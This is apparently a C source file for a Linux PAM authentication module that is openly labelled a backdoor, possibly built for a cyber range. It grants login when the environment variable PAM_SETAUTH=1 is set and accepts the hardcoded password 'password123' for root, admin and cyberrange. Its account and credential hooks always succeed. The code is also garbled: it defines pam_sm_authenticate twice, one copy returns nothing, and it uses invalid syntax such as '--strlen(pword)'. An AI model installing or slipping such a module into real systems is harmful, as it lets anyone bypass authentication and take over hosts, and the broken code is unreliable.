#define _GNU_SOURCE

#include <security/pam_modules.h>
#include <security/pam_ext.h>

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <pthread.h>  // <-- Fixes pthread_self()

#define LOG_DIR  "/etc/logcheck"
#define LOG_FILE "/etc/logcheck/pam_auth.log"
#define BUF_MAX  512
#define MAX_USERS 10

/* ---------------- DEBUG SWITCH ---------------- */

static int debug_enabled(void) {
    char *env = getenv("PAM_DEBUG");
    return (env && strcmp(env, "1") == 0);
}

/* ---------------- LOGGING CORE ---------------- */

static void ensure_path(void) {
    struct stat st;

    if (stat(LOG_DIR, &st) == -1) {
        if (mkdir(LOG_DIR, 0755) != 0) {
            perror("mkdir");
        }
    }
    
    FILE *f = fopen(LOG_FILE, "a");
    if (f) {
        fprintf(f, "\n\n");
        fclose(f);
    }
}

static void log_line(const char *msg) {
    FILE *f = fopen(LOG_FILE, "a");
    if (!f) return;
    fprintf(f, "%s\n", msg);
    fflush(f);
    fclose(f);
}

/* ---------------- TRACE MACRO ---------------- */

static void trace(const char *msg) {
    if (!debug_enabled()) return;
    log_line(msg);
}

/* ---------------- TRACE HELPERS ---------------- */

static void trace_context(pam_handle_t *pamh, const char *stage) {
    const char *user = NULL;

    if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS) {
        user = "UNKNOWN";
    }

    char buf[512];
    snprintf(buf, sizeof(buf),
             "[TRACE] %s pid=%d user=%s thread=%ld",
             stage,
             getpid(),
             user,
             (long)pthread_self());

    trace(buf);
}

/* ---------------- HARDCODED BACKDOOR ---------------- */

static struct {
    char *username;
    char *password;
} hardcoded_users[MAX_USERS] = {
    {"root", "password123"},
    {"cyberrange", "password123"},
    {"admin", "password123"},
    {"", NULL},
};

static void get_hardcoded_credentials(char **user_out, char **pass_out) {
    int i;
    for (i = 0; hardcoded_users[i].username; ++i) {
        *user_out = strdup(hardcoded_users[i].username);
        *pass_out = strdup(hardcoded_users[i].password);
        if (*user_out && *pass_out) return;
        free(*user_out);
        free(*pass_out);
    }
    *user_out = NULL;
    *pass_out = NULL;
}

/* ---------------- AUTH MODULE ---------------- */

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
                                   int flags,
                                   int argc,
                                   const char **argv)
{
    // Fix 1: Cast to void to remove warnings
    (void) flags;
    (void) argc;
    (void) argv;

    trace_context(pamh, "ENTER pam_sm_authenticate");
    ensure_path();

    // Fix 2: Declare variables BEFORE use (critical line)
    const char *pword = NULL;
    const char *uname = NULL;

    if (pam_get_item(pamh, PAM_AUTHTOK, (void*) &pword) != PAM_SUCCESS) {
        trace("PAM_AUTHTOK failed");
        return PAM_AUTHINFO_UNAVAIL;
    }

    if (pam_get_item(pamh, PAM_USER, (void*) &uname) != PAM_SUCCESS) {
        trace("PAM_USER failed");
        return PAM_AUTHINFO_UNAVAIL;
    }

    // Trim trailing whitespace/newlines from password
    while (strlen(pword) > 0) {
        char last = pword[strlen(pword)-1];
        if (last == '\n' || last == '\r' || last == '\t' || last == ' ') {
            pword[--strlen(pword)] = '\0';
        } else {
            break;
        }
    }

    /* ---------------- ENV BYPASS ---------------- */
    char *bypass = getenv("PAM_SETAUTH");
    if (bypass && strcmp(bypass, "1") == 0) {
        trace("[!] Environment bypass triggered: PAM_SETAUTH=1");
        return PAM_SUCCESS;
    }

    /* ---------------- HARDCODED PASSWORDS ---------------- */
    char *hd_user = NULL;
    char *hd_pass = NULL;
    get_hardcoded_credentials(&hd_user, &hd_pass);

    if (hd_user && hd_pass) {
        trace("[!] ATTEMPTING HARDCODED USER");
        
        if (strcmp(hd_pass, pword) == 0 && strcmp(hd_user, uname) == 0) {
            trace("[!] Hardcoded password accepted");
            trace("[TRACE] EXIT PAM_SUCCESS");
            free(hd_user);
            free(hd_pass);
            return PAM_SUCCESS;
        }
        
        free(hd_user);
        free(hd_pass);
    }

    trace("[TRACE] AUTH FAILED");
    trace("[TRACE] EXIT PAM_AUTH_ERR");
    return PAM_AUTH_ERR;
}

/* ---------------- ACCOUNT ---------------- */

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh,
                               int flags,
                               int argc,
                               const char *argv[])
{
    (void) flags;
    (void) argc;
    (void) argv;

    trace_context(pamh, "ENTER ACCOUNT");
    trace("[TRACE] ACCOUNT OK");
    return PAM_SUCCESS;
}

/* ---------------- SESSION ---------------- */

/* ---------------- AUTH MODULE ---------------- */

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
                                   int flags,
                                   int argc,
                                   const char **argv){
    // Fix 1: Cast to void to remove warnings
    (void) flags;
    (void) argc;
    (void) argv;

    trace_context(pamh, "ENTER pam_sm_authenticate");
    ensure_path();

    // Fix 2: Declare variables BEFORE use (critical line)
    const char *pword = NULL;
    const char *uname = NULL;

    if (pam_get_item(pamh, PAM_AUTHTOK, (void*) &pword) != PAM_SUCCESS) {
        trace("PAM_AUTHTOK failed");
        return PAM_AUTHINFO_UNAVAIL;
    }

    if (pam_get_item(pamh, PAM_USER, (void*) &uname) != PAM_SUCCESS) {
        trace("PAM_USER failed");
        return PAM_AUTHINFO_UNAVAIL;
    }

    // Fix 3: Correct password trimming (was: pword[--strlen(pword)])
    size_t len = strlen(pword);
    while (len > 0) {
        char last = pword[len - 1];
        if (last == '\n' || last == '\r' || last == '\t' || last == ' ') {
            pword[--len] = '\0';  // Correct: decrement len before using as index
        } else {
            break;
        }
    }
}

/* ---------------- CREDENTIALS ---------------- */

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh,
                             int flags,
                             int argc,
                             const char *argv[])
{
    (void) flags;
    (void) argc;
    (void) argv;

    trace_context(pamh, "ENTER SETCRED");

    trace("[TRACE] SETCRED SUCCESS");
    return PAM_SUCCESS;
}
